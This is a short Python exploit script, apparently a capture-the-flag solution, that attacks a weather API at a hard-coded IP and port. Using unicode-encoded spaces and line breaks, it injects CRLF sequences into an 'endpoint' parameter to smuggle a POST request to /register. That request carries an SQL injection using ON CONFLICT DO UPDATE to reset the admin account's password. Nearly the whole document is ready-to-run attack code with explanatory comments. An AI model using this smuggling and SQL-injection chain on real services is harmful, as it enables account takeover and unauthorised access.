import requests as r

sp="\u0120" # Space
rn="\u010D"+"\u010A" # \r\n

# Exploiting SQL Injection on registration to UPDATE the password of admin
# Register a new user with username "admin" and password "a') ON CONFLICT (username) DO UPDATE password='password' -- "
# Since, admin username already exists, it'll create a conflict and our injected code will get executed and updates the admin password to 'password'
username="admin"
passwordPayload="a%27)"+sp+"ON"+sp+"CONFLICT"+sp+"(username)"+sp+"DO"+sp+"UPDATE"+sp+"SET"+sp+"password=%27password%27;"+sp+"--"+sp 

postData=f"username={username}&password={passwordPayload}"

# Injecting CRLF on "endpoint" parameter to smuggle a POST request to /register with postData 
data={
    "endpoint":f"127.0.0.1/{sp}HTTP/1.1{rn}Host:{sp}127.0.0.1{rn}{rn}POST{sp}/register{sp}HTTP/1.1{rn}Host:{sp}127.0.0.1{rn}Content-Type:{sp}application/x-www-form-urlencoded{rn}Content-Length:{sp}{str(len(postData))}{rn}{rn}{postData}{rn}{rn}GET{sp}",
    "city":"Kathmandu",
    "country":"NP"
}
r.post("http://159.65.92.208:30533/api/weather",data=data)
